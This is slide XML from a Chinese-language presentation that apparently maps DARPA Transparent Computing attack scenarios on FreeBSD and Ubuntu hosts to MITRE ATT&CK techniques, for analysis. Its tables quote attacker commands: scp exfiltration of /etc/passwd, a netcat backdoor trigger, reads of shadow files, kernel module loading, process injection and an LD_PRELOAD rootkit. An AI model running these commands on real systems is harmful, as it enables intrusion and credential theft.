Protocols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成功建立 C2 Session。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T1033</a:t>
                      </a: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System Owner/User Discovery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確認權限僅為網頁伺服器帳戶 (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www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)，非 Root。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6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T1005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Data from Local System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成功讀取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/etc/passwd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4" name="Google Shape;134;p20"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="5078350" y="4096475"/>
            <a:ext cx="695725" cy="938725"/>
            <a:chOff x="5234625" y="3980000"/>
            <a:chExt cx="695725" cy="938725"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:pic>
          <p:nvPicPr>
            <p:cNvPr id="135" name="Google Shape;13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234625" y="398000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" name="Google Shape;136;p20"/>
            <p:cNvSpPr txBox="1"/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="5252938" y="4580025"/>
              <a:ext cx="6591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F0000"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>Pivot 1</a:t>
              </a:r>
              <a:endParaRPr>
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="137" name="Google Shape;137;p20"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="5055550" y="1930253"/>
            <a:ext cx="741300" cy="1034425"/>
            <a:chOff x="6011788" y="3035950"/>
            <a:chExt cx="741300" cy="1034425"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:pic>
          <p:nvPicPr>
            <p:cNvPr id="138" name="Google Shape;13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4575" y="303595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20"/>
            <p:cNvSpPr txBox="1"/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="6011788" y="3731675"/>
              <a:ext cx="7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0B57D0"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>Cadets-1</a:t>
              </a:r>
              <a:endParaRPr sz="1000">
                <a:solidFill>
                  <a:srgbClr val="0B57D0"/>
                </a:solidFill>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="140" name="Google Shape;140;p20"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm rot="10800000">
            <a:off x="5582150" y="2938000"/>
            <a:ext cx="0" cy="11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1" name="Google Shape;141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2637" y="3621787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2625" y="3237998"/>
            <a:ext cx="199775" cy="199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20"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="6925725" y="1945162"/>
            <a:ext cx="741300" cy="1034425"/>
            <a:chOff x="6011788" y="3035950"/>
            <a:chExt cx="741300" cy="1034425"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:pic>
          <p:nvPicPr>
            <p:cNvPr id="144" name="Google Shape;14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4575" y="303595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" name="Google Shape;145;p20"/>
            <p:cNvSpPr txBox="1"/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="6011788" y="3731675"/>
              <a:ext cx="7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0B57D0"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>Cadets-</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="zh-TW" sz="1000">
                  <a:solidFill>
                    <a:srgbClr val="0B57D0"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>2</a:t>
              </a:r>
              <a:endParaRPr sz="1000">
                <a:solidFill>
                  <a:srgbClr val="0B57D0"/>
                </a:solidFill>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="146" name="Google Shape;146;p20"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5277050" y="2945450"/>
            <a:ext cx="0" cy="1168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47" name="Google Shape;14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39688" y="3430688"/>
            <a:ext cx="199775" cy="1997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8" name="Google Shape;148;p20"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="6841425" y="4072962"/>
            <a:ext cx="909900" cy="921725"/>
            <a:chOff x="5252950" y="3997000"/>
            <a:chExt cx="909900" cy="921725"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:pic>
          <p:nvPicPr>
            <p:cNvPr id="149" name="Google Shape;149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360037" y="399700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20"/>
            <p:cNvSpPr txBox="1"/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="5252950" y="4580025"/>
              <a:ext cx="909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F0000"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>Jump Server</a:t>
              </a:r>
              <a:endParaRPr>
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="151" name="Google Shape;151;p20"/>
          <p:cNvCxnSpPr>
            <a:stCxn id="149" idx="0"/>
            <a:endCxn id="145" idx="2"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm rot="10800000">
            <a:off x="7296375" y="2979462"/>
            <a:ext cx="0" cy="109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2" name="Google Shape;15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48450" y="3426388"/>
            <a:ext cx="199775" cy="19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3" name="Google Shape;153;p20"/>
          <p:cNvCxnSpPr>
            <a:endCxn id="149" idx="1"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipH="1" rot="10800000">
            <a:off x="5872412" y="4420825"/>
            <a:ext cx="1076100" cy="301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stealth"/>
          </a:ln>
        </p:spPr>
      </p:cxnSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="154" name="Google Shape;154;p20"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5774075" y="4721475"/>
            <a:ext cx="1153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/>
              <a:t>RDP via </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-TW" sz="1000">
                <a:solidFill>
                  <a:srgbClr val="6AA84F"/>
                </a:solidFill>
              </a:rPr>
              <a:t>passwd</a:t>
            </a:r>
            <a:endParaRPr sz="1000">
              <a:solidFill>
                <a:srgbClr val="6AA84F"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="155" name="Google Shape;155;p20"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="8067900" y="4061187"/>
            <a:ext cx="1026600" cy="945288"/>
            <a:chOff x="5252950" y="3994375"/>
            <a:chExt cx="1026600" cy="945288"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:pic>
          <p:nvPicPr>
            <p:cNvPr id="156" name="Google Shape;156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18400" y="3994375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7" name="Google Shape;157;p20"/>
            <p:cNvSpPr txBox="1"/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="5252950" y="4600963"/>
              <a:ext cx="1026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F0000"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>Attack Stage 1</a:t>
              </a:r>
              <a:endParaRPr>
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="158" name="Google Shape;158;p20"/>
          <p:cNvCxnSpPr>
            <a:stCxn id="145" idx="3"/>
            <a:endCxn id="156" idx="0"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7667025" y="2810238"/>
            <a:ext cx="914100" cy="1251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59" name="Google Shape;159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251350" y="3297475"/>
            <a:ext cx="199775" cy="19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20"/>
          <p:cNvCxnSpPr>
            <a:stCxn id="144" idx="3"/>
            <a:endCxn id="161" idx="1"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7644237" y="2293025"/>
            <a:ext cx="6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2" name="Google Shape;162;p20"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="8149350" y="1945077"/>
            <a:ext cx="1026600" cy="945288"/>
            <a:chOff x="5252950" y="3994375"/>
            <a:chExt cx="1026600" cy="945288"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:pic>
          <p:nvPicPr>
            <p:cNvPr id="161" name="Google Shape;16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418400" y="3994375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" name="Google Shape;163;p20"/>
            <p:cNvSpPr txBox="1"/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="5252950" y="4600963"/>
              <a:ext cx="10266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F0000"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>Pivot</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="zh-TW" sz="1000">
                  <a:solidFill>
                    <a:srgbClr val="FF0000"/>
                  </a:solidFill>
                </a:rPr>
                <a:t> </a:t>
              </a:r>
              <a:r>
                <a:rPr lang="zh-TW" sz="1000">
                  <a:solidFill>
                    <a:srgbClr val="FF0000"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>2</a:t>
              </a:r>
              <a:endParaRPr>
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="164" name="Google Shape;164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872148" y="2040704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24187" y="2437600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45712" y="2436867"/>
            <a:ext cx="199775" cy="19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7" name="Google Shape;167;p20"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm rot="10800000">
            <a:off x="7636783" y="2395550"/>
            <a:ext cx="670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8" name="Google Shape;16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37" y="1495312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925" y="1876837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925" y="225833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925" y="263983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1925" y="3097700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1923" y="3688604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1937" y="4279500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1937" y="4737367"/>
            <a:ext cx="199775" cy="19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0" name="Google Shape;180;p21"/>
          <p:cNvGraphicFramePr/>
          <p:nvPr/>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="42863" y="1077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247775"/>
                <a:gridCol w="1743075"/>
                <a:gridCol w="2038350"/>
                <a:gridCol w="2314575"/>
                <a:gridCol w="1714500"/>
              </a:tblGrid>
              <a:tr h="695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1: 早期偵查與橫向移動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(2019/05/10)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漏洞掃描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攻擊者使用 Nmap 確認 SSH (22) 與 HTTP (80) 埠開啟。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nmap -sS -p 22 128.55.12.0/24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PORT STATE SERVICE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22/tcp open ssh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T1595.002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Active Scanning: Vulnerability Scanning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攻擊者確認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ta1-cadets-1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存活且開啟 SSH 服務。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使用有效帳號登入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利用先前獲取的憑證，透過 SSH 登入系統。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 admin@128.55.12.51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Warning: Permanently added...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[admin@ta1-cadets-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 ~]$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8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Valid Accounts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成功以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身份登入系統。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資料竊取 (SCP)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 SSH 協定將敏感檔案傳回攻擊者主機。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scp passwd admin@128.55.12.149:.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passwd 100% 2696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Exfiltration Over C2 Channel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成功竊取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/etc/passwd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Cadets (FreeBSD)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Cadets (FreeBSD)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7" name="Google Shape;187;p22"/>
          <p:cNvGraphicFramePr/>
          <p:nvPr/>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="42863" y="11524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247775"/>
                <a:gridCol w="1743075"/>
                <a:gridCol w="2038350"/>
                <a:gridCol w="2314575"/>
                <a:gridCol w="1714500"/>
              </a:tblGrid>
              <a:tr h="60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7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2: Nginx 後門觸發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(2019/05/16-17)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觸發伺服器後門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發送特製 HTTP POST 請求至 Port 80。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 http_post_ca75 | nc 128.55.12.75 80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</a:t>
                      </a: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1190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Exploit Public-Facing Application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伺服器回應 403 並非拒絕存取，代表著後門觸發成功。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63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3: 植入物下載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下載 Payload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受駭主機主動向 C2 發起連線，下載適用於 FreeBSD x64 的 Stage 1 程式。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request for /index.html?q=FX64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OS:F ARCH:X64 looking up "FX64"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writing 0x3D697 bytes of payload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Ingress Tool Transfer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成功下載 Drakon APT 並在記憶體中載入 (Fileless)。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4: C2 建立與執行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建立 C2 通道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惡意程式回連攻擊者控制台，建立互動式 Shell。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Initializing new freebsd console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NEW CONSOLE READY [F1]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T1071.001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Application Layer Protocol: Web Protocols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成功建立 C2 Session。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Cadets (FreeBSD)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3" name="Google Shape;193;p23"/>
          <p:cNvGraphicFramePr/>
          <p:nvPr/>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="42850" y="12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247775"/>
                <a:gridCol w="1743075"/>
                <a:gridCol w="2038350"/>
                <a:gridCol w="2314575"/>
                <a:gridCol w="1714500"/>
              </a:tblGrid>
              <a:tr h="45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857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5: 探索與權限確認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系統擁有者/使用者探索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確認當前 Shell 的權限層級。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F1&gt;whoami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uid: 80 www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F1&gt;hostname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ta1-cadets-2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Owner/User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確認權限僅為網頁伺服器帳戶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www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)，非 Root。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7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6: 資料蒐集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讀取系統檔案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嘗試讀取帳號資訊檔。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passwd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# $FreeBSD$... root:*:0:0...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Data from Local System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成功讀取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/etc/passwd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0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讀取受保護檔案 (失敗)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嘗試讀取密碼雜湊檔。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shadow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cat failed with status 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T1003.008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OS Credential Dumping: /etc/shadow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失敗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。因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www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使用者權限不足，無法讀取 shadow 檔。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6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檔案系統探索 (失敗)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嘗試列出目錄內容。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F1&gt;ls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ls failed with status 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File and Directory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失敗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。可能是 Shell 環境變數問題或權限限制導致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ls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無法執行。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9" name="Google Shape;199;p24"/>
          <p:cNvGraphicFramePr/>
          <p:nvPr/>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="1510463" y="1049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2038350"/>
                <a:gridCol w="2314575"/>
              </a:tblGrid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nmap -sS -p 22 128.55.12.0/24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PORT STATE SERVICE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22/tcp open ssh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T1595.002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Active Scanning: Vulnerability Scanning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1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 admin@128.55.12.51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Warning: Permanently added...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[admin@ta1-cadets-1 ~]$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T1078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Valid Accounts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scp passwd admin@128.55.12.149:.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passwd 100% 2696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Exfiltration Over C2 Channel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cat http_post_ca75 | nc 128.55.12.75 80</a:t>
                      </a:r>
                      <a:endParaRPr sz="1100">
                        <a:solidFill>
                          <a:srgbClr val="1F1F1F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T1190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Exploit Public-Facing Application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GET request for /index.html?q=FX64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OS:F ARCH:X64 looking up "FX64"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writing 0x3D697 bytes of payload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Ingress Tool Transfer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Initializing new freebsd console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NEW CONSOLE READY [F1]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T1071.001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Application Layer Protocol: Web Protocols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F1&gt;whoami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uid: 80 www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F1&gt;hostname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ta1-cadets-2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T1033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System Owner/User Discovery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passwd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# $FreeBSD$... root:*:0:0...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Data from Local System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F1&gt;cat shadow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cat failed with status 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T1003.008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OS Credential Dumping: /etc/shadow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8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F1&gt;ls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ls failed with status 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File and Directory Discovery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TRACE (Linux / Ubuntu)</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="205" name="Google Shape;205;p25"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="1" type="body"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="-62325" y="1125775"/>
            <a:ext cx="652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2258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zh-TW" sz="1600">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>完整場景闡述 (Scenario Narrative)</a:t>
            </a:r>
            <a:endParaRPr sz="1600"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這個場景展示了更複雜的攻擊鏈，包含從使用者層級到核心層級的提權與持久化。</a:t>
            </a:r>
            <a:endParaRPr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初始存取 (Initial Access)： 攻擊者誘使 TRACE 主機（ta1-trace-2）上的 Firefox 瀏覽器訪問被劫持的網站（如 www.yale.edu）。</a:t>
            </a:r>
            <a:endParaRPr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執行 (Execution)： Firefox 中預植的後門被觸發，下載並在記憶體中執行 Drakon APT 。</a:t>
            </a:r>
            <a:endParaRPr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提權 (Privilege Escalation)： 攻擊者上傳並載入惡意核心模組（Kernel Module）load_helper.ko (BinFmt-Elevate)。透過執行特定操作觸發該驅動程式漏洞，將權限從普通使用者（admin）提升至 Root 。</a:t>
            </a:r>
            <a:endParaRPr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防禦規避 (Defense Evasion)： 獲得 Root 權限後，攻擊者使用 Inject2 技術（基於 ptrace）將惡意代碼注入到合法的 sshd 行程中，以隱藏惡意連線並混淆視聽 。</a:t>
            </a:r>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-310832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○"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-TW">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>持久化/再連線： 透過注入後的 sshd 行程建立新的 C2 Session (L2)，即使關閉原始 Firefox 連線，攻擊者仍保有控制權 。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06" name="Google Shape;20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5918" y="3535291"/>
            <a:ext cx="695725" cy="69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7" name="Google Shape;207;p25"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="6753131" y="1371991"/>
            <a:ext cx="741300" cy="1034425"/>
            <a:chOff x="6011788" y="3035950"/>
            <a:chExt cx="741300" cy="1034425"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:pic>
          <p:nvPicPr>
            <p:cNvPr id="208" name="Google Shape;208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4575" y="303595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5"/>
            <p:cNvSpPr txBox="1"/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="6011788" y="3731675"/>
              <a:ext cx="7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0B57D0"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>Trace-2</a:t>
              </a:r>
              <a:endParaRPr sz="1000">
                <a:solidFill>
                  <a:srgbClr val="0B57D0"/>
                </a:solidFill>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="210" name="Google Shape;210;p25"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm rot="10800000">
            <a:off x="7038468" y="2366946"/>
            <a:ext cx="0" cy="11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11" name="Google Shape;211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9786" y="3087222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9773" y="2713553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94668" y="2870963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796619" y="2178101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671381" y="1929963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73079" y="2296243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26972" y="2067255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8369281" y="1929968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9" name="Google Shape;219;p25"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7228093" y="2366946"/>
            <a:ext cx="0" cy="11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20" name="Google Shape;220;p25"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm rot="10800000">
            <a:off x="7471643" y="1719854"/>
            <a:ext cx="477000" cy="9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21" name="Google Shape;221;p25"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="7925906" y="2296241"/>
            <a:ext cx="741300" cy="1211425"/>
            <a:chOff x="6011788" y="3035950"/>
            <a:chExt cx="741300" cy="1211425"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:pic>
          <p:nvPicPr>
            <p:cNvPr id="222" name="Google Shape;222;p2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4575" y="303595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" name="Google Shape;223;p25"/>
            <p:cNvSpPr txBox="1"/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="6011788" y="3731675"/>
              <a:ext cx="741300" cy="5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F0000"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>Malicious Website</a:t>
              </a:r>
              <a:endParaRPr sz="1000">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="224" name="Google Shape;224;p25"/>
          <p:cNvCxnSpPr>
            <a:stCxn id="222" idx="0"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipH="1" rot="5400000">
            <a:off x="7478006" y="1477691"/>
            <a:ext cx="837000" cy="8001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25" name="Google Shape;225;p25"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6753131" y="4231016"/>
            <a:ext cx="7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0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Pivot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226" name="Google Shape;226;p25"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="2133881">
            <a:off x="7788609" y="1364781"/>
            <a:ext cx="887690" cy="3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0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Drakon APT</a:t>
            </a:r>
            <a:endParaRPr sz="1000">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="227" name="Google Shape;227;p2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7471643" y="1158940"/>
            <a:ext cx="199750" cy="19977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28" name="Google Shape;228;p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0800000">
            <a:off x="7726142" y="1166380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TRACE (Linux / Ubuntu)</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="234" name="Google Shape;234;p26"/>
          <p:cNvGraphicFramePr/>
          <p:nvPr/>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="1231050" y="1055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783475"/>
                <a:gridCol w="3052525"/>
                <a:gridCol w="2845900"/>
              </a:tblGrid>
              <a:tr h="471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行為 (Log Evidence)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278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初始存取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誘使目標瀏覽惡意網站 </a:t>
                      </a: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www.yale.edu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T1189 - Drive-by Compromise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核心提權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insmod ./load_helper.ko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(載入惡意核心模組)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T1547.006 - Boot or Logon Autostart Execution: Kernel Modules and Extensions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核心提權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L1&gt;elevate test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-&gt; </a:t>
                      </a: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uid: 0 root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T1068 - Exploitation for Privilege Escalation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防禦規避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L1&gt;inject sc ... 16808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(行程注入 </a:t>
                      </a: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T1055 - Process Injection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持久化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NEW CONSOLE READY [L2]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(C2 寄生於 </a:t>
                      </a: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行程)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T1036 - Masquerading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失敗嘗試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export LD_PRELOAD=/lib/libselinux.so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(Azazel Rootkit)</a:t>
                      </a:r>
                      <a:br>
                        <a:rPr lang="zh-TW" sz="900">
                          <a:solidFill>
                            <a:srgbClr val="1F1F1F"/>
                          </a:solidFill>
                        </a:rPr>
                      </a:b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P.94 - Ground Truth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T1574.006 - Hijack Execution Flow: LD_PRELOAD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/>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3117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TRACE (Linux / Ubuntu)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0" name="Google Shape;240;p27"/>
          <p:cNvGraphicFramePr/>
          <p:nvPr/>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="101350" y="971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839100"/>
                <a:gridCol w="1638600"/>
                <a:gridCol w="2056200"/>
                <a:gridCol w="2538125"/>
                <a:gridCol w="18692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攻擊主機 (Source IP)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攻擊對象 (Target IP)</a:t>
                      </a:r>
                      <a:endParaRPr b="1" sz="900">
                        <a:solidFill>
                          <a:srgbClr val="1F1F1F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攻擊行為 (Log Evidence)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463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初始存取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Benign Activity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(使用者/瀏覽器)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www.yale.edu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(被劫持)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誘使目標瀏覽惡意網站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T1189 - Drive-by Compromise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Payload/C2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(TRACE-2 Firefox)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35.106.122.76:80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(C2 Stage 1 Server)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建立 C2 連線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T1105 - Ingress Tool Transfer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核心提權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128.55.12.122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(攻擊者 Console)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(TRACE-2)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insmod ./load_helper.ko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(載入核心模組)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T1547.006 - Boot or Logon Autostart Execution: Kernel Modules and Extensions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核心提權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(TRACE-2 Drakon)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(TRACE-2 本機)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L1&gt;elevate test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-&gt; </a:t>
                      </a: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uid: 0 root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T1068 - Exploitation for Privilege Escalation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防禦規避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(TRACE-2 Drakon APT)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(TRACE-2 </a:t>
                      </a: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PID 16808)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L1&gt;inject sc ... 16808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(行程注入)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T1055 - Process Injection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2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持久化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(TRACE-2 </a:t>
                      </a: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- 注入後)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128.55.12.167:8105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(攻擊者 OC2)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NEW CONSOLE READY [L2]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(寄生 C2)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T1036 - Masquerading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900">
                          <a:solidFill>
                            <a:srgbClr val="1F1F1F"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>失敗嘗試</a:t>
                      </a:r>
                      <a:endParaRPr b="1"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(TRACE-2)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128.55.12.118:4444</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="zh-TW" sz="900">
                          <a:solidFill>
                            <a:srgbClr val="1F1F1F"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t> (本地連線嘗試)</a:t>
                      </a:r>
                      <a:endParaRPr sz="9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export LD_PRELOAD=/lib/libselinux.so</a:t>
                      </a:r>
                      <a:endParaRPr sz="9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900" u="sng">
                          <a:solidFill>
                            <a:srgbClr val="0B57D0"/>
                          </a:solidFill>
                          <a:hlinkClick r:id="rId9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T1574.006 - Hijack Execution Flow: LD_PRELOAD</a:t>
                      </a:r>
                      <a:endParaRPr sz="900" u="sng">
                        <a:solidFill>
                          <a:srgbClr val="0B57D0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281925" y="1714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zh-TW"/>
              <a:t>Scenario of Trace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6" name="Google Shape;246;p28"/>
          <p:cNvGraphicFramePr/>
          <p:nvPr/>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="562900" y="6857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2867725"/>
                <a:gridCol w="2276800"/>
              </a:tblGrid>
              <a:tr h="332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363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T1595.002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Active Scanning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確認目標存活。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T1078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Valid Accounts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成功以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身份登入。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T1041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Exfiltration Over C2 Channel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成功竊取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/etc/passwd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T1189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Drive-by Compromise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成功觸發後門，建立 C2 連線 (L1)。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1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T1059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Command and Scripting Interpreter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成功取得初始 Shell 權限 (uid: 1003 admin)。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9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T1547.006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Kernel Modules and Extensions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準備提權環境。這是利用 Linux 核心機制的攻擊。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7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T1068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Exploitation for Privilege Escalation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成功取得 Root 權限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9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T1057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Process Discovery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選定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(SSH Daemon) 作為注入目標。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7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T1055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Process Injection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代碼成功注入至合法的系統行程。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54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T1036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Masquerading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攻擊者現在「寄生」在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行程內運作，極難被發現。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47" name="Google Shape;24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3886" y="3829053"/>
            <a:ext cx="695725" cy="6957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8" name="Google Shape;248;p28"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="6121098" y="1665753"/>
            <a:ext cx="741300" cy="1034425"/>
            <a:chOff x="6011788" y="3035950"/>
            <a:chExt cx="741300" cy="1034425"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:pic>
          <p:nvPicPr>
            <p:cNvPr id="249" name="Google Shape;249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4575" y="303595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0" name="Google Shape;250;p28"/>
            <p:cNvSpPr txBox="1"/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="6011788" y="3731675"/>
              <a:ext cx="7413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0B57D0"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>Trace-2</a:t>
              </a:r>
              <a:endParaRPr sz="1000">
                <a:solidFill>
                  <a:srgbClr val="0B57D0"/>
                </a:solidFill>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="251" name="Google Shape;251;p28"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm rot="10800000">
            <a:off x="6406436" y="2660708"/>
            <a:ext cx="0" cy="11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52" name="Google Shape;252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7753" y="3380984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57740" y="3007315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62636" y="3164725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64586" y="2471863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039348" y="2223725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41047" y="2590004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794939" y="2361017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737248" y="2223730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60" name="Google Shape;260;p28"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6596061" y="2660708"/>
            <a:ext cx="0" cy="11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1" name="Google Shape;261;p28"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm rot="10800000">
            <a:off x="6839610" y="2013616"/>
            <a:ext cx="477000" cy="92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262" name="Google Shape;262;p28"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="7293873" y="2590003"/>
            <a:ext cx="741300" cy="1211425"/>
            <a:chOff x="6011788" y="3035950"/>
            <a:chExt cx="741300" cy="1211425"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:pic>
          <p:nvPicPr>
